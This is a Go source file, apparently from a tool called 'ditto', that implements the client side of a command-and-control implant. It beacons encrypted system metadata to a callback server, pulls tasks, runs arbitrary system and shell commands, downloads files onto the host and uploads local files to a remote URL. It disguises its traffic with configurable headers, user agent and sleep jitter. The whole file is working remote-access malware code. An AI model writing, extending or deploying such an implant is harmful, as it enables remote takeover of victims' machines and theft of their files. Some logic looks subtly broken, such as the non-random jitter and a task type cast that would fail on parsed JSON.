package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/ditto/ditto/commands"
	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/crypto"
	"github.com/ditto/ditto/platform"
)

// Client handles C2 client operations
type Client struct {
	config     *core.Config
	logger     interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
	sessionID  string
	callbackURL string
	httpClient *http.Client
	key        []byte
}

// NewClient creates a new C2 client
func NewClient(config *core.Config, logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *Client {
	return &Client{
		config:     config,
		logger:     logger,
		sessionID:  config.Session.SessionID,
		callbackURL: "",
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
		key: config.Session.Key,
	}
}

// Connect establishes connection to C2 server
func (c *Client) Connect(callbackURL string) error {
	c.callbackURL = callbackURL
	c.logger.Info("Connecting to C2 server: %s", callbackURL)
	
	// Perform initial beacon
	_, err := c.beacon()
	if err != nil {
		return fmt.Errorf("initial beacon failed: %w", err)
	}
	
	c.logger.Info("Successfully connected to C2 server")
	return nil
}

// Run starts the client main loop
func (c *Client) Run() {
	for {
		// Calculate sleep time with jitter
		sleep := c.calculateSleep()
		
		c.logger.Debug("Sleeping for %v", sleep)
		time.Sleep(sleep)
		
		// Send beacon and get tasks
		tasks, err := c.beacon()
		if err != nil {
			c.logger.Error("Beacon failed: %v", err)
			continue
		}
		
		// Process tasks
		for _, task := range tasks {
			c.processTask(task)
		}
	}
}

func (c *Client) beacon() ([]map[string]interface{}, error) {
	// Collect system metadata
	metadata := c.collectMetadata()
	
	// Encrypt metadata
	encrypted, err := crypto.AES256Encrypt(metadata, c.key)
	if err != nil {
		return nil, fmt.Errorf("encryption failed: %w", err)
	}
	
	// Create request
	req, err := http.NewRequest("POST", c.callbackURL+"/beacon", bytes.NewReader(encrypted))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}
	
	// Set headers
	c.setHeaders(req)
	req.Header.Set("X-Session-ID", c.sessionID)
	
	// Send request
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status: %d", resp.StatusCode)
	}
	
	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}
	
	// Decrypt response
	decrypted, err := crypto.AES256Decrypt(body, c.key)
	if err != nil {
		return nil, fmt.Errorf("decryption failed: %w", err)
	}
	
	// Parse response
	var response map[string]interface{}
	if err := json.Unmarshal(decrypted, &response); err != nil {
		return nil, fmt.Errorf("failed to parse response: %w", err)
	}
	
	// Extract tasks
	tasks, _ := response["tasks"].([]map[string]interface{})
	return tasks, nil
}

func (c *Client) processTask(task map[string]interface{}) {
	taskType, _ := task["type"].(string)
	taskID, _ := task["id"].(string)
	
	c.logger.Info("Processing task: %s (type: %s)", taskID, taskType)
	
	var result map[string]interface{}
	
	switch taskType {
	case "execute":
		result = c.executeCommand(task)
	case "download":
		result = c.downloadFile(task)
	case "upload":
		result = c.uploadFile(task)
	case "shell":
		result = c.executeShell(task)
	default:
		result = map[string]interface{}{
			"task_id": taskID,
			"status":  "error",
			"error":   "unknown task type",
		}
	}
	
	// Send result back
	c.sendResult(result)
}

func (c *Client) executeCommand(task map[string]interface{}) map[string]interface{} {
	command, _ := task["command"].(string)
	
	// Execute command based on OS
	output, err := executeSystemCommand(command)
	
	return map[string]interface{}{
		"task_id": task["id"],
		"status":  "success",
		"output":  output,
		"error":   errToString(err),
	}
}

func (c *Client) downloadFile(task map[string]interface{}) map[string]interface{} {
	url, _ := task["url"].(string)
	dest, _ := task["destination"].(string)
	
	executor := commands.NewExecutor(300 * time.Second)
	err := executor.DownloadFile(url, dest)
	
	return map[string]interface{}{
		"task_id": task["id"],
		"status":  errToString(err),
		"error":   errToString(err),
	}
}

func (c *Client) uploadFile(task map[string]interface{}) map[string]interface{} {
	source, _ := task["source"].(string)
	url, _ := task["url"].(string)
	
	executor := commands.NewExecutor(300 * time.Second)
	err := executor.UploadFile(source, url)
	
	return map[string]interface{}{
		"task_id": task["id"],
		"status":  errToString(err),
		"error":   errToString(err),
	}
}

func (c *Client) executeShell(task map[string]interface{}) map[string]interface{} {
	command, _ := task["command"].(string)
	
	output, err := executeSystemCommand(command)
	
	return map[string]interface{}{
		"task_id": task["id"],
		"status":  "success",
		"output":  output,
		"error":   errToString(err),
	}
}

func (c *Client) sendResult(result map[string]interface{}) {
	data, err := json.Marshal(result)
	if err != nil {
		c.logger.Error("Failed to marshal result: %v", err)
		return
	}
	
	encrypted, err := crypto.AES256Encrypt(data, c.key)
	if err != nil {
		c.logger.Error("Failed to encrypt result: %v", err)
		return
	}
	
	req, err := http.NewRequest("POST", c.callbackURL+"/result", bytes.NewReader(encrypted))
	if err != nil {
		c.logger.Error("Failed to create request: %v", err)
		return
	}
	
	c.setHeaders(req)
	req.Header.Set("X-Session-ID", c.sessionID)
	
	resp, err := c.httpClient.Do(req)
	if err != nil {
		c.logger.Error("Failed to send result: %v", err)
		return
	}
	defer resp.Body.Close()
}

func (c *Client) calculateSleep() time.Duration {
	baseSleep := c.config.Communication.Sleep
	jitter := c.config.Communication.Jitter
	
	// Apply jitter
	jitterAmount := time.Duration(float64(baseSleep) * jitter)
	return baseSleep + jitterAmount
}

func (c *Client) collectMetadata() []byte {
	metadata := platform.GetSystemInfo()
	data, err := json.Marshal(metadata)
	if err != nil {
		// Return empty JSON object on marshal failure
		return []byte("{}")
	}
	return data
}

func (c *Client) setHeaders(req *http.Request) {
	for k, v := range c.config.Communication.Headers {
		req.Header.Set(k, v)
	}
	req.Header.Set("User-Agent", c.config.Communication.UserAgent)
}

// Platform-specific helpers (would be implemented per OS)
func executeSystemCommand(cmd string) (string, error) {
	// Use commands package for execution
	executor := commands.NewExecutor(60 * time.Second)
	return executor.Execute(cmd)
}

func errToString(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}

